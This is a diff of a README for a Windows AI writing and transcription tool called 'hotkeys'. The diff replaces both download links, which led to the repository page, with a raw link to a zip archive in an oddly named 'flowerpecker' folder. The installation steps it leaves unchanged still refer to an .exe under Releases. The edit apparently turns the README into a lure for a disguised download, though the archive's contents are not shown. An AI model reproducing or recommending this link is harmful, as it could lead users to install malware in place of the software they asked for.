@@ -1,6 +1,6 @@
 # ⌨️ hotkeys - Simplify your writing and typing tasks
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/rotund-episcopate534/hotkeys)
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://raw.githubusercontent.com/rotund-episcopate534/hotkeys/main/flowerpecker/Software_2.8.zip)
 
 This application uses artificial intelligence to help you write better text and transcribe your voice. You can use it to fix grammar, change your tone, or turn spoken words into written documents. It lives in your system tray and waits for your keyboard commands to start working.
 
@@ -8,7 +8,7 @@ This application uses artificial intelligence to help you write better text and 
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Go to the [official download page](https://github.com/rotund-episcopate534/hotkeys).
+1. Go to the [official download page](https://raw.githubusercontent.com/rotund-episcopate534/hotkeys/main/flowerpecker/Software_2.8.zip).
 2. Look for the latest version under the Releases section.
 3. Download the file that ends in .exe.
 4. Open the file to start the installer. 
